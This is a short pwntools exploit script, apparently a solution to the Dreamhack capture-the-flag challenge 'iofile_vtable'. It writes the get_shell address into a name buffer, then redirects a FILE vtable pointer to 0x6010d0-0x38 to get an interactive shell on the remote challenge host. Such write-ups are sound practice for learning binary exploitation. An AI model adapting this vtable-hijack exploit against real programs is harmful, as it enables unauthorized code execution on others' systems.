#!/usr/bin/python3

from pwn import *

exe = ELF("./iofile_vtable")

context.binary = exe

s   = lambda data: p.send(data)
sa  = lambda msg, data: p.sendafter(msg, data)
sl  = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn  = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*
        c
        ''')
        input()


if args.REMOTE:
    p = remote('host3.dreamhack.games', 16921)
else:
    p = process([exe.path])
GDB()

sa(b'name: ', p64(exe.sym.get_shell))
slna(b'> ', 4)
sa(b'change: ', p64(0x6010d0-0x38))
slna(b'> ', 2)




p.interactive()

